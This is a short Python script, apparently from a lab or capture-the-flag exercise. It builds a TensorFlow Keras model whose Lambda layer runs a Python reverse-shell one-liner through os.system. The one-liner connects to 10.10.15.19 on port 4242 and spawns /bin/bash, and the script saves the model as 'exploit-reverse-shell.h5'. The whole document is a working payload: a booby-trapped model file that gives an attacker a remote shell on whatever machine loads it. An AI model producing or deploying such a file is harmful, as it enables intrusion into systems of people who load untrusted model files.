import tensorflow as tf

def exploit(x):
    import os
    cmd = "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.15.19\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/bash\")'"
    os.system(cmd)
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit-reverse-shell.h5")